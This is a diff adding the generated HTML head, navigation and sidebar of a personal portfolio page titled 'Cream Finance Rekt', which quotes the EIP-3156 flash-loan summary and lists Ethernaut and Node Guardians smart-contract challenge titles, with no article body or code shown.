@@ -1,0 +1,1443 @@
+<!DOCTYPE html>
+<html lang="en"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="robots" content="noindex, nofollow" />
+  <link rel="icon shortcut" href="/favicon.ico" sizes="32x32" />
+<link rel="icon" href="/favicon.svg" type="image/svg+xml" />
+<link rel="icon" href="/favicon-dark.svg" type="image/svg+xml" media="(prefers-color-scheme: dark)" />
+<link rel="icon" href="/favicon-16x16.png" type="image/png" sizes="16x16" />
+<link rel="icon" href="/favicon-32x32.png" type="image/png" sizes="32x32" />
+<link rel="apple-touch-icon" href="/apple-touch-icon.png" sizes="180x180" />
+<link fetchpriority="low" href="/site.webmanifest" rel="manifest" />
+
+  <title>Cream Finance Rekt – jfrancai</title>
+  <meta name="description" content="https://rekt.news/cream-rekt/
+Flash Loan EIP : https://eips.ethereum.org/EIPS/eip-3156
+Simple Summary This ERC provides standard interfaces and processes for single-asset flash loans.
+Abstract A flash loan is a smart contract transaction in which a lender smart contract lends assets to a borrower smart contract with the condition that the assets are returned, plus an optional fee, before the end of the transaction. This ERC specifies interfaces for lenders to accept flash loan requests, and for borrowers to take temporary control of the transaction within the lender execution." />
+
+  
+
+<meta property="og:title" content="Cream Finance Rekt" />
+<meta property="og:description" content="A Friendly Cloud Installer for Cloud Native Application Bundles" />
+<meta property="og:type" content="website" />
+<meta property="og:url" content="//localhost:1313/projects/node-guardians/cream-finance-rekt-04ac5f09eb5d42c0b28fcdd8aabdc19d/" /><meta property="og:site_name" content="Porter" />
+
+  <meta itemprop="name" content="Cream Finance Rekt">
+<meta itemprop="description" content="A Friendly Cloud Installer for Cloud Native Application Bundles"><meta name="twitter:card" content="summary"/><meta name="twitter:title" content="Cream Finance Rekt"/>
+<meta name="twitter:description" content="A Friendly Cloud Installer for Cloud Native Application Bundles"/>
+
+    <link href="/css/compiled/main.css" rel="stylesheet" />
+
+
+
+  <link href="/css/custom.css" rel="stylesheet" />
+
+
+
+  
+
+
+  <script>
+     
+    const defaultTheme = 'system';
+
+    const setDarkTheme = () => {
+      document.documentElement.classList.add("dark");
+      document.documentElement.style.colorScheme = "dark";
+    }
+    const setLightTheme = () => {
+      document.documentElement.classList.remove("dark");
+      document.documentElement.style.colorScheme = "light";
+    }
+
+    if ("color-theme" in localStorage) {
+      localStorage.getItem("color-theme") === "dark" ? setDarkTheme() : setLightTheme();
+    } else {
+      defaultTheme === "dark" ? setDarkTheme() : setLightTheme();
+      if (defaultTheme === "system") {
+        window.matchMedia("(prefers-color-scheme: dark)").matches ? setDarkTheme() : setLightTheme();
+      }
+    }
+  </script>
+
+  
+</head>
+<body dir="ltr"><div class="nav-container sticky top-0 z-20 w-full bg-transparent print:hidden">
+  <div class="nav-container-blur pointer-events-none absolute z-[-1] h-full w-full bg-white dark:bg-dark shadow-[0_2px_4px_rgba(0,0,0,.02),0_1px_0_rgba(0,0,0,.06)] contrast-more:shadow-[0_0_0_1px_#000] dark:shadow-[0_-1px_0_rgba(255,255,255,.1)_inset] contrast-more:dark:shadow-[0_0_0_1px_#fff]"></div>
+
+  <nav class="mx-auto flex items-center justify-end gap-2 h-16 px-6 max-w-[90rem]">
+    <a class="flex items-center hover:opacity-75 ltr:mr-auto rtl:ml-auto" href="/">
+        <img class="block dark:hidden" src="/images/pp.jpg" alt="jfrancai" height="40" width="40" />
+        <img class="hidden dark:block" src="/images/pp.jpg" alt="jfrancai" height="40" width="40" />
+        <span class="mx-2 font-extrabold inline select-none" title="jfrancai">jfrancai</span>
+    </a><a
+            title="Projects"
+            href="/projects"
+            
+            class="text-sm contrast-more:text-gray-700 contrast-more:dark:text-gray-100 relative -ml-2 hidden whitespace-nowrap p-2 md:inline-block font-medium"
+          >
+            <span class="text-center">Projects</span>
+          </a><a
+            title="About"
+            href="/about"
+            
+            class="text-sm contrast-more:text-gray-700 contrast-more:dark:text-gray-100 relative -ml-2 hidden whitespace-nowrap p-2 md:inline-block text-gray-600 hover:text-gray-800 dark:text-gray-400 dark:hover:text-gray-200"
+          >
+            <span class="text-center">About</span>
+          </a><a
+            title="Contact ↗"
+            href="https://github.com/jfrancai"
+            target="_blank" rel="noreferer"
+            class="text-sm contrast-more:text-gray-700 contrast-more:dark:text-gray-100 relative -ml-2 hidden whitespace-nowrap p-2 md:inline-block text-gray-600 hover:text-gray-800 dark:text-gray-400 dark:hover:text-gray-200"
+          >
+            <span class="text-center">Contact ↗</span>
+          </a><div class="search-wrapper relative md:w-64">
+  <div class="relative flex items-center text-gray-900 contrast-more:text-gray-800 dark:text-gray-300 contrast-more:dark:text-gray-300">
+    <input
+      placeholder="Search..."
+      class="search-input block w-full appearance-none rounded-lg px-3 py-2 transition-colors text-base leading-tight md:text-sm bg-black/[.05] dark:bg-gray-50/10 focus:bg-white dark:focus:bg-dark placeholder:text-gray-500 dark:placeholder:text-gray-400 contrast-more:border contrast-more:border-current"
+      type="search"
+      value=""
+      spellcheck="false"
+    />
+    <kbd
+      class="absolute my-1.5 select-none ltr:right-1.5 rtl:left-1.5 h-5 rounded bg-white px-1.5 font-mono text-[10px] font-medium text-gray-500 border dark:border-gray-100/20 dark:bg-dark/50 contrast-more:border-current contrast-more:text-current contrast-more:dark:border-current items-center gap-1 transition-opacity pointer-events-none hidden sm:flex"
+    >
+      CTRL K
+    </kbd>
+  </div>
+
+  <div>
+    <ul
+      class="search-results hextra-scrollbar hidden border border-gray-200 bg-white text-gray-100 dark:border-neutral-800 dark:bg-neutral-900 absolute top-full z-20 mt-2 overflow-auto overscroll-contain rounded-xl py-2.5 shadow-xl max-h-[min(calc(50vh-11rem-env(safe-area-inset-bottom)),400px)] md:max-h-[min(calc(100vh-5rem-env(safe-area-inset-bottom)),400px)] inset-x-0 ltr:md:left-auto rtl:md:right-auto contrast-more:border contrast-more:border-gray-900 contrast-more:dark:border-gray-50 w-screen min-h-[100px] max-w-[min(calc(100vw-2rem),calc(100%+20rem))]"
+      style="transition: max-height 0.2s ease 0s;"
+    ></ul>
+  </div>
+</div>
+
+          <a class="p-2 text-current" target="_blank" rel="noreferer" href="https://github.com/jfrancai/portfolio" title="GitHub"><svg height=24 fill="currentColor" viewBox="3 3 18 18">
+  <path d="M12 3C7.0275 3 3 7.12937 3 12.2276C3 16.3109 5.57625 19.7597 9.15374 20.9824C9.60374 21.0631 9.77249 20.7863 9.77249 20.5441C9.77249 20.3249 9.76125 19.5982 9.76125 18.8254C7.5 19.2522 6.915 18.2602 6.735 17.7412C6.63375 17.4759 6.19499 16.6569 5.8125 16.4378C5.4975 16.2647 5.0475 15.838 5.80124 15.8264C6.51 15.8149 7.01625 16.4954 7.18499 16.7723C7.99499 18.1679 9.28875 17.7758 9.80625 17.5335C9.885 16.9337 10.1212 16.53 10.38 16.2993C8.3775 16.0687 6.285 15.2728 6.285 11.7432C6.285 10.7397 6.63375 9.9092 7.20749 9.26326C7.1175 9.03257 6.8025 8.08674 7.2975 6.81794C7.2975 6.81794 8.05125 6.57571 9.77249 7.76377C10.4925 7.55615 11.2575 7.45234 12.0225 7.45234C12.7875 7.45234 13.5525 7.55615 14.2725 7.76377C15.9937 6.56418 16.7475 6.81794 16.7475 6.81794C17.2424 8.08674 16.9275 9.03257 16.8375 9.26326C17.4113 9.9092 17.76 10.7281 17.76 11.7432C17.76 15.2843 15.6563 16.0687 13.6537 16.2993C13.98 16.5877 14.2613 17.1414 14.2613 18.0065C14.2613 19.2407 14.25 20.2326 14.25 20.5441C14.25 20.7863 14.4188 21.0746 14.8688 20.9824C16.6554 20.364 18.2079 19.1866 19.3078 17.6162C20.4077 16.0457 20.9995 14.1611 21 12.2276C21 7.12937 16.9725 3 12 3Z"></path>
+</svg>
+<span class="sr-only">GitHub</span>
+          </a>
+          <a class="p-2 text-current" target="_blank" rel="noreferer" href="https://twitter.com/jfrancai_" title="Twitter"><svg height=24 xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M389.2 48h70.6L305.6 224.2 487 464H345L233.7 318.6 106.5 464H35.8L200.7 275.5 26.8 48H172.4L272.9 180.9 389.2 48zM364.4 421.8h39.1L151.1 88h-42L364.4 421.8z"/></svg><span class="sr-only">Twitter</span>
+          </a><button type="button" aria-label="Menu" class="hamburger-menu -mr-2 rounded p-2 active:bg-gray-400/20 md:hidden"><svg height=24 fill="none" viewBox="0 0 24 24" stroke="currentColor"><g><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 8H20"></path></g><g><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 16H20"></path></g></svg></button>
+  </nav>
+</div>
+
+  <div class='mx-auto flex max-w-screen-xl'>
+    <div class="mobile-menu-overlay [transition:background-color_1.5s_ease] fixed inset-0 z-10 bg-black/80 dark:bg-black/60 hidden"></div>
+<aside class="sidebar-container flex flex-col print:hidden md:top-16 md:shrink-0 md:w-64 md:self-start max-md:[transform:translate3d(0,-100%,0)] md:sticky">
+  
+  <div class="px-4 pt-4 md:hidden">
+    <div class="search-wrapper relative md:w-64">
+  <div class="relative flex items-center text-gray-900 contrast-more:text-gray-800 dark:text-gray-300 contrast-more:dark:text-gray-300">
+    <input
+      placeholder="Search..."
+      class="search-input block w-full appearance-none rounded-lg px-3 py-2 transition-colors text-base leading-tight md:text-sm bg-black/[.05] dark:bg-gray-50/10 focus:bg-white dark:focus:bg-dark placeholder:text-gray-500 dark:placeholder:text-gray-400 contrast-more:border contrast-more:border-current"
+      type="search"
+      value=""
+      spellcheck="false"
+    />
+    <kbd
+      class="absolute my-1.5 select-none ltr:right-1.5 rtl:left-1.5 h-5 rounded bg-white px-1.5 font-mono text-[10px] font-medium text-gray-500 border dark:border-gray-100/20 dark:bg-dark/50 contrast-more:border-current contrast-more:text-current contrast-more:dark:border-current items-center gap-1 transition-opacity pointer-events-none hidden sm:flex"
+    >
+      CTRL K
+    </kbd>
+  </div>
+
+  <div>
+    <ul
+      class="search-results hextra-scrollbar hidden border border-gray-200 bg-white text-gray-100 dark:border-neutral-800 dark:bg-neutral-900 absolute top-full z-20 mt-2 overflow-auto overscroll-contain rounded-xl py-2.5 shadow-xl max-h-[min(calc(50vh-11rem-env(safe-area-inset-bottom)),400px)] md:max-h-[min(calc(100vh-5rem-env(safe-area-inset-bottom)),400px)] inset-x-0 ltr:md:left-auto rtl:md:right-auto contrast-more:border contrast-more:border-gray-900 contrast-more:dark:border-gray-50 w-screen min-h-[100px] max-w-[min(calc(100vw-2rem),calc(100%+20rem))]"
+      style="transition: max-height 0.2s ease 0s;"
+    ></ul>
+  </div>
+</div>
+
+  </div>
+  <div class="hextra-scrollbar overflow-y-auto overflow-x-hidden p-4 grow md:h-[calc(100vh-var(--navbar-height)-var(--menu-height))]">
+    <ul class="flex flex-col gap-1 md:hidden">
+      
+      
+          <li class="open"><a
+    class="flex items-center justify-between gap-2 cursor-pointer rounded px-2 py-1.5 text-sm transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      text-gray-500 hover:bg-gray-100 hover:text-gray-900 contrast-more:border contrast-more:border-transparent contrast-more:text-gray-900 contrast-more:hover:border-gray-900 dark:text-neutral-400 dark:hover:bg-primary-100/5 dark:hover:text-gray-50 contrast-more:dark:text-gray-50 contrast-more:dark:hover:border-gray-50"
+    href="/projects/"
+    
+  >Projects
+        <span class="hextra-sidebar-collapsible-button"><svg fill="none" viewBox="0 0 24 24" stroke="currentColor" class="h-[18px] min-w-[18px] rounded-sm p-0.5 hover:bg-gray-800/5 dark:hover:bg-gray-100/5"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7" class="origin-center transition-transform rtl:-rotate-180"></path></svg></span>
+    </a><div class="ltr:pr-0 overflow-hidden">
+        <ul class='relative flex flex-col gap-1 before:absolute before:inset-y-1 before:w-px before:bg-gray-200 before:content-[""] ltr:ml-3 ltr:pl-3 ltr:before:left-0 rtl:mr-3 rtl:pr-3 rtl:before:right-0 dark:before:bg-neutral-800'><li class="flex flex-col "><a
+    class="flex items-center justify-between gap-2 cursor-pointer rounded px-2 py-1.5 text-sm transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      text-gray-500 hover:bg-gray-100 hover:text-gray-900 contrast-more:border contrast-more:border-transparent contrast-more:text-gray-900 contrast-more:hover:border-gray-900 dark:text-neutral-400 dark:hover:bg-primary-100/5 dark:hover:text-gray-50 contrast-more:dark:text-gray-50 contrast-more:dark:hover:border-gray-50"
+    href="/projects/ethernaut/"
+    
+  >The Ethernaut
+        <span class="hextra-sidebar-collapsible-button"><svg fill="none" viewBox="0 0 24 24" stroke="currentColor" class="h-[18px] min-w-[18px] rounded-sm p-0.5 hover:bg-gray-800/5 dark:hover:bg-gray-100/5"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7" class="origin-center transition-transform rtl:-rotate-180"></path></svg></span>
+    </a>
+              <div class="ltr:pr-0 overflow-hidden">
+        <ul class='relative flex flex-col gap-1 before:absolute before:inset-y-1 before:w-px before:bg-gray-200 before:content-[""] ltr:ml-3 ltr:pl-3 ltr:before:left-0 rtl:mr-3 rtl:pr-3 rtl:before:right-0 dark:before:bg-neutral-800'><li class="flex flex-col "><a
+    class="flex items-center justify-between gap-2 cursor-pointer rounded px-2 py-1.5 text-sm transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      text-gray-500 hover:bg-gray-100 hover:text-gray-900 contrast-more:border contrast-more:border-transparent contrast-more:text-gray-900 contrast-more:hover:border-gray-900 dark:text-neutral-400 dark:hover:bg-primary-100/5 dark:hover:text-gray-50 contrast-more:dark:text-gray-50 contrast-more:dark:hover:border-gray-50"
+    href="/projects/ethernaut/hello-ethernaut-9a7c00bee0ac470faad194c59361cd05/"
+    
+  >Hello Ethernaut
+    </a>
+              
+            </li><li class="flex flex-col "><a
+    class="flex items-center justify-between gap-2 cursor-pointer rounded px-2 py-1.5 text-sm transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      text-gray-500 hover:bg-gray-100 hover:text-gray-900 contrast-more:border contrast-more:border-transparent contrast-more:text-gray-900 contrast-more:hover:border-gray-900 dark:text-neutral-400 dark:hover:bg-primary-100/5 dark:hover:text-gray-50 contrast-more:dark:text-gray-50 contrast-more:dark:hover:border-gray-50"
+    href="/projects/ethernaut/fallback-0f16d7ea49bd4084a635ec4d24c77563/"
+    
+  >Fallback
+    </a>
+              
+            </li><li class="flex flex-col "><a
+    class="flex items-center justify-between gap-2 cursor-pointer rounded px-2 py-1.5 text-sm transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      text-gray-500 hover:bg-gray-100 hover:text-gray-900 contrast-more:border contrast-more:border-transparent contrast-more:text-gray-900 contrast-more:hover:border-gray-900 dark:text-neutral-400 dark:hover:bg-primary-100/5 dark:hover:text-gray-50 contrast-more:dark:text-gray-50 contrast-more:dark:hover:border-gray-50"
+    href="/projects/ethernaut/fal1out-eb9fe61a4da943248fa363e1918dd9f6/"
+    
+  >Fal1out
+    </a>
+              
+            </li><li class="flex flex-col "><a
+    class="flex items-center justify-between gap-2 cursor-pointer rounded px-2 py-1.5 text-sm transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      text-gray-500 hover:bg-gray-100 hover:text-gray-900 contrast-more:border contrast-more:border-transparent contrast-more:text-gray-900 contrast-more:hover:border-gray-900 dark:text-neutral-400 dark:hover:bg-primary-100/5 dark:hover:text-gray-50 contrast-more:dark:text-gray-50 contrast-more:dark:hover:border-gray-50"
+    href="/projects/ethernaut/coin-flip-c27578d40d2f427d968d5623d7000dab/"
+    
+  >Coin Flip
+    </a>
+              
+            </li><li class="flex flex-col "><a
+    class="flex items-center justify-between gap-2 cursor-pointer rounded px-2 py-1.5 text-sm transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      text-gray-500 hover:bg-gray-100 hover:text-gray-900 contrast-more:border contrast-more:border-transparent contrast-more:text-gray-900 contrast-more:hover:border-gray-900 dark:text-neutral-400 dark:hover:bg-primary-100/5 dark:hover:text-gray-50 contrast-more:dark:text-gray-50 contrast-more:dark:hover:border-gray-50"
+    href="/projects/ethernaut/telephone-8b2069f0beb045b69400a28665c1d56c/"
+    
+  >Telephone
+    </a>
+              
+            </li><li class="flex flex-col "><a
+    class="flex items-center justify-between gap-2 cursor-pointer rounded px-2 py-1.5 text-sm transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      text-gray-500 hover:bg-gray-100 hover:text-gray-900 contrast-more:border contrast-more:border-transparent contrast-more:text-gray-900 contrast-more:hover:border-gray-900 dark:text-neutral-400 dark:hover:bg-primary-100/5 dark:hover:text-gray-50 contrast-more:dark:text-gray-50 contrast-more:dark:hover:border-gray-50"
+    href="/projects/ethernaut/token-4a8cb8765f8c412190f2db4a7989f9b5/"
+    
+  >Token
+    </a>
+              
+            </li><li class="flex flex-col "><a
+    class="flex items-center justify-between gap-2 cursor-pointer rounded px-2 py-1.5 text-sm transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      text-gray-500 hover:bg-gray-100 hover:text-gray-900 contrast-more:border contrast-more:border-transparent contrast-more:text-gray-900 contrast-more:hover:border-gray-900 dark:text-neutral-400 dark:hover:bg-primary-100/5 dark:hover:text-gray-50 contrast-more:dark:text-gray-50 contrast-more:dark:hover:border-gray-50"
+    href="/projects/ethernaut/delegation-0c005c8b167c4966926771bad0ff918c/"
+    
+  >Delegation
+    </a>
+              
+            </li><li class="flex flex-col "><a
+    class="flex items-center justify-between gap-2 cursor-pointer rounded px-2 py-1.5 text-sm transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      text-gray-500 hover:bg-gray-100 hover:text-gray-900 contrast-more:border contrast-more:border-transparent contrast-more:text-gray-900 contrast-more:hover:border-gray-900 dark:text-neutral-400 dark:hover:bg-primary-100/5 dark:hover:text-gray-50 contrast-more:dark:text-gray-50 contrast-more:dark:hover:border-gray-50"
+    href="/projects/ethernaut/force-79bc75128abc41f2b25e56b521833ab6/"
+    
+  >Force
+    </a>
+              
+            </li><li class="flex flex-col "><a
+    class="flex items-center justify-between gap-2 cursor-pointer rounded px-2 py-1.5 text-sm transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      text-gray-500 hover:bg-gray-100 hover:text-gray-900 contrast-more:border contrast-more:border-transparent contrast-more:text-gray-900 contrast-more:hover:border-gray-900 dark:text-neutral-400 dark:hover:bg-primary-100/5 dark:hover:text-gray-50 contrast-more:dark:text-gray-50 contrast-more:dark:hover:border-gray-50"
+    href="/projects/ethernaut/vault-d8ba3eafb273440f9a492b042e65f214/"
+    
+  >Vault
+    </a>
+              
+            </li><li class="flex flex-col "><a
+    class="flex items-center justify-between gap-2 cursor-pointer rounded px-2 py-1.5 text-sm transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      text-gray-500 hover:bg-gray-100 hover:text-gray-900 contrast-more:border contrast-more:border-transparent contrast-more:text-gray-900 contrast-more:hover:border-gray-900 dark:text-neutral-400 dark:hover:bg-primary-100/5 dark:hover:text-gray-50 contrast-more:dark:text-gray-50 contrast-more:dark:hover:border-gray-50"
+    href="/projects/ethernaut/king-8338a297a2b447b3b40166c68586199d/"
+    
+  >King
+    </a>
+              
+            </li><li class="flex flex-col "><a
+    class="flex items-center justify-between gap-2 cursor-pointer rounded px-2 py-1.5 text-sm transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      text-gray-500 hover:bg-gray-100 hover:text-gray-900 contrast-more:border contrast-more:border-transparent contrast-more:text-gray-900 contrast-more:hover:border-gray-900 dark:text-neutral-400 dark:hover:bg-primary-100/5 dark:hover:text-gray-50 contrast-more:dark:text-gray-50 contrast-more:dark:hover:border-gray-50"
+    href="/projects/ethernaut/re-entrancy-6ea65e4888e349dabdc4ca12c8e6d22d/"
+    
+  >Re-entrancy
+    </a>
+              
+            </li><li class="flex flex-col "><a
+    class="flex items-center justify-between gap-2 cursor-pointer rounded px-2 py-1.5 text-sm transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      text-gray-500 hover:bg-gray-100 hover:text-gray-900 contrast-more:border contrast-more:border-transparent contrast-more:text-gray-900 contrast-more:hover:border-gray-900 dark:text-neutral-400 dark:hover:bg-primary-100/5 dark:hover:text-gray-50 contrast-more:dark:text-gray-50 contrast-more:dark:hover:border-gray-50"
+    href="/projects/ethernaut/elevator-59c41c694afa45c68e603000da840a2e/"
+    
+  >Elevator
+    </a>
+              
+            </li><li class="flex flex-col "><a
+    class="flex items-center justify-between gap-2 cursor-pointer rounded px-2 py-1.5 text-sm transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      text-gray-500 hover:bg-gray-100 hover:text-gray-900 contrast-more:border contrast-more:border-transparent contrast-more:text-gray-900 contrast-more:hover:border-gray-900 dark:text-neutral-400 dark:hover:bg-primary-100/5 dark:hover:text-gray-50 contrast-more:dark:text-gray-50 contrast-more:dark:hover:border-gray-50"
+    href="/projects/ethernaut/privacy-0141c59931824d74a8311099eb338d5d/"
+    
+  >Privacy
+    </a>
+              
+            </li><li class="flex flex-col "><a
+    class="flex items-center justify-between gap-2 cursor-pointer rounded px-2 py-1.5 text-sm transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      text-gray-500 hover:bg-gray-100 hover:text-gray-900 contrast-more:border contrast-more:border-transparent contrast-more:text-gray-900 contrast-more:hover:border-gray-900 dark:text-neutral-400 dark:hover:bg-primary-100/5 dark:hover:text-gray-50 contrast-more:dark:text-gray-50 contrast-more:dark:hover:border-gray-50"
+    href="/projects/ethernaut/gatekeeper-one-9bbda6efa6c24367aa643eb73ae92a6a/"
+    
+  >Gatekeeper One
+    </a>
+              
+            </li><li class="flex flex-col "><a
+    class="flex items-center justify-between gap-2 cursor-pointer rounded px-2 py-1.5 text-sm transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      text-gray-500 hover:bg-gray-100 hover:text-gray-900 contrast-more:border contrast-more:border-transparent contrast-more:text-gray-900 contrast-more:hover:border-gray-900 dark:text-neutral-400 dark:hover:bg-primary-100/5 dark:hover:text-gray-50 contrast-more:dark:text-gray-50 contrast-more:dark:hover:border-gray-50"
+    href="/projects/ethernaut/gatekeeper-two-d4a070f38b644143a295ecf4467fb7fa/"
+    
+  >Gatekeeper Two
+    </a>
+              
+            </li><li class="flex flex-col "><a
+    class="flex items-center justify-between gap-2 cursor-pointer rounded px-2 py-1.5 text-sm transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      text-gray-500 hover:bg-gray-100 hover:text-gray-900 contrast-more:border contrast-more:border-transparent contrast-more:text-gray-900 contrast-more:hover:border-gray-900 dark:text-neutral-400 dark:hover:bg-primary-100/5 dark:hover:text-gray-50 contrast-more:dark:text-gray-50 contrast-more:dark:hover:border-gray-50"
+    href="/projects/ethernaut/naught-coin-5013cfef45d646e693a6feaac127ac33/"
+    
+  >Naught Coin
+    </a>
+              
+            </li></ul>
+      </div>
+            </li><li class="flex flex-col open"><a
+    class="flex items-center justify-between gap-2 cursor-pointer rounded px-2 py-1.5 text-sm transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      text-gray-500 hover:bg-gray-100 hover:text-gray-900 contrast-more:border contrast-more:border-transparent contrast-more:text-gray-900 contrast-more:hover:border-gray-900 dark:text-neutral-400 dark:hover:bg-primary-100/5 dark:hover:text-gray-50 contrast-more:dark:text-gray-50 contrast-more:dark:hover:border-gray-50"
+    href="/projects/node-guardians/"
+    
+  >Node Guardians
+        <span class="hextra-sidebar-collapsible-button"><svg fill="none" viewBox="0 0 24 24" stroke="currentColor" class="h-[18px] min-w-[18px] rounded-sm p-0.5 hover:bg-gray-800/5 dark:hover:bg-gray-100/5"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7" class="origin-center transition-transform rtl:-rotate-180"></path></svg></span>
+    </a>
+              <div class="ltr:pr-0 overflow-hidden">
+        <ul class='relative flex flex-col gap-1 before:absolute before:inset-y-1 before:w-px before:bg-gray-200 before:content-[""] ltr:ml-3 ltr:pl-3 ltr:before:left-0 rtl:mr-3 rtl:pr-3 rtl:before:right-0 dark:before:bg-neutral-800'><li class="flex flex-col "><a
+    class="flex items-center justify-between gap-2 cursor-pointer rounded px-2 py-1.5 text-sm transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      text-gray-500 hover:bg-gray-100 hover:text-gray-900 contrast-more:border contrast-more:border-transparent contrast-more:text-gray-900 contrast-more:hover:border-gray-900 dark:text-neutral-400 dark:hover:bg-primary-100/5 dark:hover:text-gray-50 contrast-more:dark:text-gray-50 contrast-more:dark:hover:border-gray-50"
+    href="/projects/node-guardians/price-oracle-attack-48bb5fd1fcf5428e84266833aecafe4f/"
+    
+  >Price Oracle Attack
+    </a>
+              
+            </li><li class="flex flex-col "><a
+    class="flex items-center justify-between gap-2 cursor-pointer rounded px-2 py-1.5 text-sm transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      text-gray-500 hover:bg-gray-100 hover:text-gray-900 contrast-more:border contrast-more:border-transparent contrast-more:text-gray-900 contrast-more:hover:border-gray-900 dark:text-neutral-400 dark:hover:bg-primary-100/5 dark:hover:text-gray-50 contrast-more:dark:text-gray-50 contrast-more:dark:hover:border-gray-50"
+    href="/projects/node-guardians/wintermute-rekt-d0fd4609147941e6af7fcc68ef81da6a/"
+    
+  >Wintermute Rekt
+    </a>
+              
+            </li><li class="flex flex-col open"><a
+    class="flex items-center justify-between gap-2 cursor-pointer rounded px-2 py-1.5 text-sm transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      sidebar-active-item bg-primary-100 font-semibold text-primary-800 contrast-more:border contrast-more:border-primary-500 dark:bg-primary-400/10 dark:text-primary-600 contrast-more:dark:border-primary-500"
+    href="/projects/node-guardians/cream-finance-rekt-04ac5f09eb5d42c0b28fcdd8aabdc19d/"
+    
+  >Cream Finance Rekt
+    </a>
+  
+    <ul class='flex flex-col gap-1 relative before:absolute before:inset-y-1 before:w-px before:bg-gray-200 before:content-[""] dark:before:bg-neutral-800 ltr:pl-3 ltr:before:left-0 rtl:pr-3 rtl:before:right-0 ltr:ml-3 rtl:mr-3'><li>
+              <a
+                href="#simple-summary"
+                class="flex rounded px-2 py-1.5 text-sm transition-colors [word-break:break-word] cursor-pointer [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] contrast-more:border gap-2 before:opacity-25 before:content-['#'] text-gray-500 hover:bg-gray-100 hover:text-gray-900 dark:text-neutral-400 dark:hover:bg-primary-100/5 dark:hover:text-gray-50 contrast-more:text-gray-900 contrast-more:dark:text-gray-50 contrast-more:border-transparent contrast-more:hover:border-gray-900 contrast-more:dark:hover:border-gray-50"
+              >Simple Summary</a>
+            </li>
+          <li>
+              <a
+                href="#abstract"
+                class="flex rounded px-2 py-1.5 text-sm transition-colors [word-break:break-word] cursor-pointer [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] contrast-more:border gap-2 before:opacity-25 before:content-['#'] text-gray-500 hover:bg-gray-100 hover:text-gray-900 dark:text-neutral-400 dark:hover:bg-primary-100/5 dark:hover:text-gray-50 contrast-more:text-gray-900 contrast-more:dark:text-gray-50 contrast-more:border-transparent contrast-more:hover:border-gray-900 contrast-more:dark:hover:border-gray-50"
+              >Abstract</a>
+            </li>
+          <li>
+              <a
+                href="#motivation"
+                class="flex rounded px-2 py-1.5 text-sm transition-colors [word-break:break-word] cursor-pointer [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] contrast-more:border gap-2 before:opacity-25 before:content-['#'] text-gray-500 hover:bg-gray-100 hover:text-gray-900 dark:text-neutral-400 dark:hover:bg-primary-100/5 dark:hover:text-gray-50 contrast-more:text-gray-900 contrast-more:dark:text-gray-50 contrast-more:border-transparent contrast-more:hover:border-gray-900 contrast-more:dark:hover:border-gray-50"
+              >Motivation</a>
+            </li>
+          <li>
+              <a
+                href="#simple-summary-1"
+                class="flex rounded px-2 py-1.5 text-sm transition-colors [word-break:break-word] cursor-pointer [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] contrast-more:border gap-2 before:opacity-25 before:content-['#'] text-gray-500 hover:bg-gray-100 hover:text-gray-900 dark:text-neutral-400 dark:hover:bg-primary-100/5 dark:hover:text-gray-50 contrast-more:text-gray-900 contrast-more:dark:text-gray-50 contrast-more:border-transparent contrast-more:hover:border-gray-900 contrast-more:dark:hover:border-gray-50"
+              >Simple Summary</a>
+            </li>
+          <li>
+              <a
+                href="#abstract-1"
